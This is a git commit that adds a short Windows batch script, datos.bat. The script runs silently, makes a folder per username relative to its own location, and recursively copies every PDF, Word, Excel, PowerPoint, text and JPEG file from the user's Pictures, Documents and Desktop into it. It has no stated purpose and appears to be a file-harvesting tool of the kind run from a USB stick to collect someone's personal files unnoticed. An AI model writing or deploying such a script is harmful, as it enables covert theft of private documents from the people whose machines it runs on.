3b317ab8b38c826159e4f5d51f9367e49cfee9de
gllorentek <87646239+gllorentek@users.noreply.github.com>
2021-07-19 12:43:02 +0200

    Add files via upload

---
+++ datos.bat
@@ -0,0 +1,14 @@
+@echo off
+
+IF NOT EXIST ".\cosas\"%USERNAME% MD ".\cosas\"%USERNAME%
+
+cd ".\cosas\"%USERNAME%
+
+for /R %USERPROFILE%\Pictures\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
+
+for /R %USERPROFILE%\Documents\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
+for /R %USERPROFILE%\Desktop\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
+
+
+EXIT
+
